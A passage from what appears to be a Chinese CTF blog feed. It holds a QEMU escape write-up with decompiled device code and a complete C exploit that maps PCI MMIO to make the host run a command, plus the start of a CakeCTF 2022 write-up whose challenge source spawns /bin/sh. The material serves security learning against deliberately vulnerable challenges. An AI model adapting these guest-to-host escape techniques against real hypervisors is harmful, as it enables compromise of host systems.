class="markdownIt-Anchor" href="#references">#</a> references</h1><p><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">Learning Linux Kernel Exploitation - Part 1 - Midas Blog</a><br><a href="https://blog.csdn.net/weixin_46483787/article/details/124199102">2020 hxpctf kernel-rop_Ayakaaaa 的博客 - CSDN 博客</a><br><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/"> FGKASLR - CTF Wiki</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://2020.ctf.link/&quot;&gt;Challenges&lt;/a&gt;&lt;br&gt;
hxpCTF 2020 kernel-rop&lt;br&gt;
 已经同步到 gittee&lt;/p&gt;
&lt;p&gt;先读取出 init 的文件系统&lt;/p&gt;
&lt;figure class=&quot;hi</summary>
      
    
    
    
    <category term="CTF" scheme="https://squirre17.github.io/categories/CTF/"/>
    
    
    <category term="Linux" scheme="https://squirre17.github.io/tags/Linux/"/>
    
    <category term="Kernel state" scheme="https://squirre17.github.io/tags/Kernel-state/"/>
    
  </entry>
  
  <entry>
    <title>a-easy-virtualization-challenge</title>
    <link href="https://squirre17.github.io/2022/09/16/a-easy-virtualization-challenge/"/>
    <id>https://squirre17.github.io/2022/09/16/a-easy-virtualization-challenge/</id>
    <published>2022-09-16T02:43:40.000Z</published>
    <updated>2022-09-30T01:53:20.138Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_5713A8</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = sub_70031D(a1, <span class="string">&quot;pci-device&quot;</span>, <span class="string">&quot;/home/wang/qemu/hw/misc/myrfid.c&quot;</span>, <span class="number">369LL</span>, <span class="string">&quot;rfid_class_init&quot;</span>);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = qxl_reset_handler;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">208</span>) = <span class="number">0x420</span>;          [<span class="number">1</span>] &lt;&lt;- vendor_id</span><br><span class="line">  *(_WORD *)(result + <span class="number">210</span>) = <span class="number">0x1337</span>;         [<span class="number">2</span>] &lt;&lt;- device_id</span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">0x69</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个和源码对应关系如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">qxl_pci_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class="line"></span><br><span class="line">    k-&gt;vendor_id = REDHAT_PCI_VENDOR_ID;</span><br><span class="line">    k-&gt;device_id = QXL_DEVICE_ID_STABLE;</span><br><span class="line">    set_bit(DEVICE_CATEGORY_DISPLAY, dc-&gt;categories);</span><br><span class="line">    dc-&gt;reset = qxl_reset_handler;</span><br><span class="line">    dc-&gt;vmsd = &amp;qxl_vmstate;</span><br><span class="line">    device_class_set_props(dc, qxl_properties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>凭借着厂商 id 和设备 id 就能找到总线上的位置<br>登入进去看到总线</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">lspci -nvv</span></span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 0420:1337                 [1] &lt;&lt;- 是这个b</span><br></pre></td></tr></table></figure><p>然后可以看到内存中的位置✨TODO</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># cat /sys/devices/pci0000\:00/0000:00:04.0/resource</span></span><br><span class="line"><span class="number">0x00000000fb000000</span> <span class="number">0x00000000fbffffff</span> <span class="number">0x0000000000040200</span></span><br><span class="line"><span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line">起始地址            终止地址             长度</span><br></pre></td></tr></table></figure><p>注意<br> source 是给用户看的 而 resource0~10 之类的是给我们 open 的<br> source 就是整合了这些的表格</p><p>从 handler 跟下去<br>发现有一处调用了函数数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_571043</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_570742(*(_QWORD *)(a1 + <span class="number">120</span>), <span class="number">1LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_5C950D(a1, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, a2) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_570635(a1 + <span class="number">2688</span>, <span class="number">1LL</span>, sub_570A2E, a1);</span><br><span class="line">    sub_843CE1(a1 + <span class="number">2520</span>);</span><br><span class="line">    sub_843FBD(a1 + <span class="number">2576</span>);</span><br><span class="line">    sub_8449B4(a1 + <span class="number">2512</span>, <span class="string">&quot;rfid&quot;</span>, sub_570E7C, a1, <span class="number">0LL</span>);</span><br><span class="line">    sub_31B892(a1 + <span class="number">2272</span>, a1, func_array, a1, <span class="string">&quot;rfid-mmio&quot;</span>, &amp;off_1000000);  [<span class="number">1</span>] &lt;&lt;- vuln</span><br><span class="line">    <span class="title function_">sub_5C1EF2</span><span class="params">(a1, <span class="number">0LL</span>, <span class="number">0LL</span>, a1 + <span class="number">2272</span>)</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数数组如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000F</span>E9720 func_array      dq offset vuln          ; DATA XREF: qxl_reset_handler+<span class="number">111</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000F</span>E9728                 dq offset sub_570CEB</span><br></pre></td></tr></table></figure><p>其实这就是个 op 表 里面放的是 read write 之类的<br>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps qxl_io_ops = &#123;</span><br><span class="line">    .read = ioport_read,</span><br><span class="line">    .write = ioport_write,</span><br><span class="line">    .valid = &#123;</span><br><span class="line">        .min_access_size = <span class="number">1</span>,</span><br><span class="line">        .max_access_size = <span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>终于来到了漏洞函数<br>只要让这个变量 和他对应的秘籍相同即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vuln</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ((a2 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>) != <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(cheats);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(byte_122FFE0, cheats, v2) )</span><br><span class="line">      system(command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">270438LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这个变量可以往上 xref</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">mmio_write</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 dst, __int64 src, <span class="type">unsigned</span> <span class="type">int</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD n[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  v6 = dst;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">1</span>] = src;</span><br><span class="line">  v11 = a1;</span><br><span class="line">  v8 = (dst &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  idx = (dst &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  result = (_BYTE *)((dst &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="type">unsigned</span> __int64)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      result = byteArray;</span><br><span class="line">      byteArray[idx] = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">      result = byteArray;</span><br><span class="line">      byteArray[idx] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">      result = byteArray;</span><br><span class="line">      byteArray[idx] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">      result = byteArray;</span><br><span class="line">      byteArray[idx] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      result = byteArray;</span><br><span class="line">      byteArray[idx] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5uLL</span>:</span><br><span class="line">      result = byteArray;</span><br><span class="line">      byteArray[idx] = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6uLL</span>:</span><br><span class="line">      v10 = (<span class="type">unsigned</span> __int16)v6;</span><br><span class="line">      result = <span class="built_in">memcpy</span>(&amp;command[(<span class="type">unsigned</span> __int16)v6], &amp;n[<span class="number">1</span>], num);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这正是函数数组的第二个成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000F</span>E9720 func_array      dq offset mmio_read     ; DATA XREF: qxl_reset_handler+<span class="number">111</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000F</span>E9728                 dq offset mmio_write</span><br></pre></td></tr></table></figure><p>我们只需要往 cmd 里写入命令<br>然后写入秘籍<br> read 的时候就能命令执行了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./head.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *mmio_mem;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_read</span><span class="params">(u64 dst)</span>&#123;</span><br><span class="line">  assert(dst + mmio_mem &gt; mmio_mem);</span><br><span class="line">  u64 ret = *((u64 *)(mmio_mem + dst));</span><br><span class="line">  Done(<span class="string">&quot;mmio_read&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// qemu中并没有真的对qemu的的内存读写</span></span><br><span class="line"><span class="comment">// 作为参数传递给qemu的write</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(u64 cho, u64 idx, <span class="type">char</span> chr)</span>&#123;</span><br><span class="line">  u64 dst = ((cho &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">20</span>);</span><br><span class="line">  u64 val = <span class="number">0</span>;</span><br><span class="line">  dst |= ((idx &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  Info(<span class="string">&quot;dst is %d&quot;</span>, dst);</span><br><span class="line">  <span class="keyword">if</span>(cho == <span class="number">6</span>)&#123;</span><br><span class="line">    val = chr;</span><br><span class="line">    dst = idx;</span><br><span class="line">    dst |= ((cho &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">20</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *((u64 *)(mmio_mem + dst)) = val;</span><br><span class="line">  Done(<span class="string">&quot;mmio_write&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_cheats</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="comment">// aWwssadadbaba </span></span><br><span class="line">  mmio_write(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  mmio_write(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">  mmio_write(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  mmio_write(<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>);</span><br><span class="line">  mmio_write(<span class="number">2</span>,<span class="number">4</span>,<span class="number">0</span>);</span><br><span class="line">  mmio_write(<span class="number">3</span>,<span class="number">5</span>,<span class="number">0</span>);</span><br><span class="line">  mmio_write(<span class="number">2</span>,<span class="number">6</span>,<span class="number">0</span>);</span><br><span class="line">  mmio_write(<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>);</span><br><span class="line">  mmio_write(<span class="number">5</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">  mmio_write(<span class="number">4</span>,<span class="number">9</span>,<span class="number">0</span>);</span><br><span class="line">  mmio_write(<span class="number">5</span>,<span class="number">10</span>,<span class="number">0</span>);</span><br><span class="line">  mmio_write(<span class="number">4</span>,<span class="number">11</span>,<span class="number">0</span>);</span><br><span class="line">  Done(<span class="string">&quot;write_cheats&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_cmd</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(cmd); i++)</span><br><span class="line">    mmio_write(<span class="number">6</span>, i, cmd[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> mmio_fd = open(</span><br><span class="line">    <span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,</span><br><span class="line">    O_RDWR | O_SYNC</span><br><span class="line">  );</span><br><span class="line">  mmio_mem = mmap(</span><br><span class="line">    <span class="number">0</span>, <span class="number">0x1000000</span>,</span><br><span class="line">    PROT_WRITE | PROT_READ,</span><br><span class="line">    MAP_SHARED, mmio_fd, <span class="number">0</span></span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">if</span>(mmio_mem == MAP_FAILED)</span><br><span class="line">    Abort(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">  Info(<span class="string">&quot;mmio_mem is 0x%lx&quot;</span>, mmio_mem);</span><br><span class="line">  write_cheats();</span><br><span class="line">  write_cmd(<span class="string">&quot;xcalc&quot;</span>);<span class="comment">// gnome-calculator 也行</span></span><br><span class="line">  mmio_read((<span class="number">1</span> &lt;&lt; <span class="number">20</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    <category term="CTF" scheme="https://squirre17.github.io/categories/CTF/"/>
    
    
    <category term="Linux" scheme="https://squirre17.github.io/tags/Linux/"/>
    
    <category term="virtualization" scheme="https://squirre17.github.io/tags/virtualization/"/>
    
  </entry>
  
  <entry>
    <title>2022-cakeCTF-pwn-wp</title>
    <link href="https://squirre17.github.io/2022/09/12/2022-cakeCTF-pwn-wp/"/>
    <id>https://squirre17.github.io/2022/09/12/2022-cakeCTF-pwn-wp/</id>
    <published>2022-09-12T11:39:37.000Z</published>
    <updated>2022-09-30T01:52:54.577Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://2022.cakectf.com/tasks/1538875340/">CakeCTF 2022</a></p><h1 id="welkerme"><a class="markdownIt-Anchor" href="#welkerme">#</a> welkerme</h1><p>没开 kaslr 没开 smep<br> 找到 cc 和 pkc 一把梭了</p><h1 id="strvscstr"><a class="markdownIt-Anchor" href="#strvscstr">#</a> str.vs.cstr</h1><p>c++ 简单溢出<br>没开 pie 和 relro</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Test</span> &#123;</span></span><br><span class="line">Test() &#123;</span><br><span class="line"><span class="built_in">std</span>::fill(_c_str, _c_str + <span class="number">0x20</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span>* <span class="title function_">c_str</span><span class="params">()</span> &#123; <span class="keyword">return</span> _c_str; &#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>&amp; <span class="title function_">str</span><span class="params">()</span> &#123; <span class="keyword">return</span> _str; &#125;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">__attribute__((used))</span><br><span class="line"><span class="type">void</span> <span class="title function_">call_me</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">std</span>::system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> _c_str[<span class="number">0x20</span>];</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> _str;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">Test test;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">std</span>::setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1. set c_str&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;2. get c_str&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;3. set str&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;4. get str&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.good()) &#123;</span><br><span class="line"><span class="type">int</span> choice = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;choice: &quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; choice;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (choice) &#123;</span><br><span class="line"><span 